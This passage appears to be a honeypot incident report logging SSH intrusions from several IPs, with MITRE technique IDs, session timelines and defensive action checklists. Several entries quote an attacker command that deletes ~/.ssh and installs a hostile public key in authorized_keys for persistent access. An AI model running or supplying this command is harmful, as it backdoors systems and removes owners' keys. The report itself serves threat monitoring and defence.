| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:30:35` | `cowrie.session.connect` |
| `2026-05-22 17:30:35` | `cowrie.client.version` |
| `2026-05-22 17:30:35` | `cowrie.client.kex` |
| `2026-05-22 17:30:36` | `cowrie.login.success` |
| `2026-05-22 17:30:37` | `cowrie.session.params` |
| `2026-05-22 17:30:37` | `cowrie.command.input` |
| `2026-05-22 17:30:37` | `cowrie.command.failed` |
| `2026-05-22 17:30:37` | `cowrie.log.closed` |
| `2026-05-22 17:30:38` | `cowrie.session.params` |
| `2026-05-22 17:30:38` | `cowrie.command.input` |
| `2026-05-22 17:30:38` | `cowrie.session.file_download` |
| `2026-05-22 17:30:38` | `cowrie.log.closed` |
| `2026-05-22 17:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7653566331a7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:30 |
| **Last Seen** | 2026-05-22 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:30:42` | `cowrie.session.connect` |
| `2026-05-22 17:30:42` | `cowrie.client.version` |
| `2026-05-22 17:30:42` | `cowrie.client.kex` |
| `2026-05-22 17:30:43` | `cowrie.login.success` |
| `2026-05-22 17:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375a0354a764

| Field | Detail |
|---|---|
| **Source IP** | `101.126.147[.]62` |
| **First Seen** | 2026-05-22 17:30 |
| **Last Seen** | 2026-05-22 17:35 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:30:51` | `cowrie.session.connect` |
| `2026-05-22 17:30:51` | `cowrie.client.version` |
| `2026-05-22 17:30:51` | `cowrie.client.kex` |
| `2026-05-22 17:30:54` | `cowrie.login.success` |
| `2026-05-22 17:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.147[.]62` to AbuseIPDB if not already reported
- [ ] Block `101.126.147[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d295ae0c3f8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:32 |
| **Last Seen** | 2026-05-22 17:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:32:19` | `cowrie.session.connect` |
| `2026-05-22 17:32:19` | `cowrie.client.version` |
| `2026-05-22 17:32:19` | `cowrie.client.kex` |
| `2026-05-22 17:32:20` | `cowrie.login.success` |
| `2026-05-22 17:32:21` | `cowrie.session.params` |
| `2026-05-22 17:32:21` | `cowrie.command.input` |
| `2026-05-22 17:32:21` | `cowrie.command.failed` |
| `2026-05-22 17:32:21` | `cowrie.log.closed` |
| `2026-05-22 17:32:22` | `cowrie.session.params` |
| `2026-05-22 17:32:22` | `cowrie.command.input` |
| `2026-05-22 17:32:22` | `cowrie.session.file_download` |
| `2026-05-22 17:32:22` | `cowrie.log.closed` |
| `2026-05-22 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8fa37a20d55

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:32 |
| **Last Seen** | 2026-05-22 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:32:26` | `cowrie.session.connect` |
| `2026-05-22 17:32:26` | `cowrie.client.version` |
| `2026-05-22 17:32:26` | `cowrie.client.kex` |
| `2026-05-22 17:32:27` | `cowrie.login.success` |
| `2026-05-22 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a6be1637a4

| Field | Detail |
|---|---|
| **Source IP** | `85.184.248[.]187` |
| **First Seen** | 2026-05-22 17:32 |
| **Last Seen** | 2026-05-22 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:32:53` | `cowrie.session.connect` |
| `2026-05-22 17:32:53` | `cowrie.client.version` |
| `2026-05-22 17:32:53` | `cowrie.client.kex` |
| `2026-05-22 17:32:53` | `cowrie.login.success` |
| `2026-05-22 17:32:54` | `cowrie.session.params` |
| `2026-05-22 17:32:54` | `cowrie.command.input` |
| `2026-05-22 17:32:54` | `cowrie.command.failed` |
| `2026-05-22 17:32:54` | `cowrie.log.closed` |
| `2026-05-22 17:32:54` | `cowrie.session.params` |
| `2026-05-22 17:32:54` | `cowrie.command.input` |
| `2026-05-22 17:32:54` | `cowrie.session.file_download` |
| `2026-05-22 17:32:54` | `cowrie.log.closed` |
| `2026-05-22 17:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.184.248[.]187` to AbuseIPDB if not already reported
- [ ] Block `85.184.248[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db546865dc00

| Field | Detail |
|---|---|
| **Source IP** | `85.184.248[.]187` |
| **First Seen** | 2026-05-22 17:32 |
| **Last Seen** | 2026-05-22 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:32:56` | `cowrie.session.connect` |
| `2026-05-22 17:32:56` | `cowrie.client.version` |
| `2026-05-22 17:32:57` | `cowrie.client.kex` |
| `2026-05-22 17:32:57` | `cowrie.login.success` |
| `2026-05-22 17:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.184.248[.]187` to AbuseIPDB if not already reported
- [ ] Block `85.184.248[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa19607b3b2

| Field | Detail |
|---|---|
| **Source IP** | `43.108.17[.]138` |
| **First Seen** | 2026-05-22 17:33 |
| **Last Seen** | 2026-05-22 17:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:33:07` | `cowrie.session.connect` |
| `2026-05-22 17:33:07` | `cowrie.client.version` |
| `2026-05-22 17:33:07` | `cowrie.client.kex` |
| `2026-05-22 17:33:08` | `cowrie.login.success` |
| `2026-05-22 17:33:08` | `cowrie.session.params` |
| `2026-05-22 17:33:08` | `cowrie.command.input` |
| `2026-05-22 17:33:08` | `cowrie.command.failed` |
| `2026-05-22 17:33:08` | `cowrie.log.closed` |
| `2026-05-22 17:33:08` | `cowrie.session.params` |
| `2026-05-22 17:33:08` | `cowrie.command.input` |
| `2026-05-22 17:33:08` | `cowrie.session.file_download` |
| `2026-05-22 17:33:08` | `cowrie.log.closed` |
| `2026-05-22 17:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.108.17[.]138` to AbuseIPDB if not already reported
- [ ] Block `43.108.17[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77f649de912

| Field | Detail |
|---|---|
| **Source IP** | `43.108.17[.]138` |
| **First Seen** | 2026-05-22 17:33 |
| **Last Seen** | 2026-05-22 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:33:11` | `cowrie.session.connect` |
| `2026-05-22 17:33:11` | `cowrie.client.version` |
| `2026-05-22 17:33:11` | `cowrie.client.kex` |
| `2026-05-22 17:33:11` | `cowrie.login.success` |
| `2026-05-22 17:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.108.17[.]138` to AbuseIPDB if not already reported
- [ ] Block `43.108.17[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c82147483f1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:34 |
| **Last Seen** | 2026-05-22 17:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:34:07` | `cowrie.session.connect` |
| `2026-05-22 17:34:07` | `cowrie.client.version` |
| `2026-05-22 17:34:08` | `cowrie.client.kex` |
| `2026-05-22 17:34:09` | `cowrie.login.success` |
| `2026-05-22 17:34:10` | `cowrie.session.params` |
| `2026-05-22 17:34:10` | `cowrie.command.input` |
| `2026-05-22 17:34:10` | `cowrie.command.failed` |
| `2026-05-22 17:34:10` | `cowrie.log.closed` |
| `2026-05-22 17:34:10` | `cowrie.session.params` |
| `2026-05-22 17:34:10` | `cowrie.command.input` |
| `2026-05-22 17:34:11` | `cowrie.session.file_download` |
| `2026-05-22 17:34:11` | `cowrie.log.closed` |
| `2026-05-22 17:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0f51856633

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:34 |
| **Last Seen** | 2026-05-22 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:34:14` | `cowrie.session.connect` |
| `2026-05-22 17:34:14` | `cowrie.client.version` |
| `2026-05-22 17:34:14` | `cowrie.client.kex` |
| `2026-05-22 17:34:16` | `cowrie.login.success` |
| `2026-05-22 17:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069c421aaaf7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:35 |
| **Last Seen** | 2026-05-22 17:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:35:57` | `cowrie.session.connect` |
| `2026-05-22 17:35:57` | `cowrie.client.version` |
| `2026-05-22 17:35:58` | `cowrie.client.kex` |
| `2026-05-22 17:35:59` | `cowrie.login.success` |
| `2026-05-22 17:36:00` | `cowrie.session.params` |
| `2026-05-22 17:36:00` | `cowrie.command.input` |
| `2026-05-22 17:36:00` | `cowrie.command.failed` |
| `2026-05-22 17:36:00` | `cowrie.log.closed` |
| `2026-05-22 17:36:00` | `cowrie.session.params` |
| `2026-05-22 17:36:00` | `cowrie.command.input` |
| `2026-05-22 17:36:01` | `cowrie.session.file_download` |
| `2026-05-22 17:36:01` | `cowrie.log.closed` |
| `2026-05-22 17:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7cd3d5310d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:36 |
| **Last Seen** | 2026-05-22 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:36:04` | `cowrie.session.connect` |
| `2026-05-22 17:36:04` | `cowrie.client.version` |
| `2026-05-22 17:36:04` | `cowrie.client.kex` |
| `2026-05-22 17:36:06` | `cowrie.login.success` |
| `2026-05-22 17:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66a3ed05cb1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:37 |
| **Last Seen** | 2026-05-22 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:37:49` | `cowrie.session.connect` |
| `2026-05-22 17:37:49` | `cowrie.client.version` |
| `2026-05-22 17:37:49` | `cowrie.client.kex` |
| `2026-05-22 17:37:50` | `cowrie.login.success` |
| `2026-05-22 17:37:51` | `cowrie.session.params` |
| `2026-05-22 17:37:51` | `cowrie.command.input` |
| `2026-05-22 17:37:51` | `cowrie.command.failed` |
| `2026-05-22 17:37:51` | `cowrie.log.closed` |
| `2026-05-22 17:37:52` | `cowrie.session.params` |
| `2026-05-22 17:37:52` | `cowrie.command.input` |
| `2026-05-22 17:37:52` | `cowrie.session.file_download` |
| `2026-05-22 17:37:52` | `cowrie.log.closed` |
| `2026-05-22 17:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7774add94080

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:37 |
| **Last Seen** | 2026-05-22 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:37:55` | `cowrie.session.connect` |
| `2026-05-22 17:37:55` | `cowrie.client.version` |
| `2026-05-22 17:37:56` | `cowrie.client.kex` |
| `2026-05-22 17:37:57` | `cowrie.login.success` |
| `2026-05-22 17:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f92ba0c176

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:39 |
| **Last Seen** | 2026-05-22 17:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:39:35` | `cowrie.session.connect` |
| `2026-05-22 17:39:35` | `cowrie.client.version` |
| `2026-05-22 17:39:36` | `cowrie.client.kex` |
| `2026-05-22 17:39:37` | `cowrie.login.success` |
| `2026-05-22 17:39:38` | `cowrie.session.params` |
| `2026-05-22 17:39:38` | `cowrie.command.input` |
| `2026-05-22 17:39:38` | `cowrie.command.failed` |
| `2026-05-22 17:39:38` | `cowrie.log.closed` |
| `2026-05-22 17:39:39` | `cowrie.session.params` |
| `2026-05-22 17:39:39` | `cowrie.command.input` |
| `2026-05-22 17:39:39` | `cowrie.session.file_download` |
| `2026-05-22 17:39:39` | `cowrie.log.closed` |
| `2026-05-22 17:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84b772aa205f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:39 |
| **Last Seen** | 2026-05-22 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:39:42` | `cowrie.session.connect` |
| `2026-05-22 17:39:42` | `cowrie.client.version` |
| `2026-05-22 17:39:43` | `cowrie.client.kex` |
| `2026-05-22 17:39:44` | `cowrie.login.success` |
| `2026-05-22 17:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.147[.]62` | **16** | 2026-05-22 17:29 | 2026-05-22 17:30 | 1m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]80` | **16** | 2026-05-22 17:15 | 2026-05-22 17:41 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.96.151[.]198` | **15** | 2026-05-22 15:08 | 2026-05-22 15:58 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.9.145[.]130` | **15** | 2026-05-22 15:16 | 2026-05-22 16:33 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.103.169[.]12` | **12** | 2026-05-22 14:48 | 2026-05-22 15:37 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
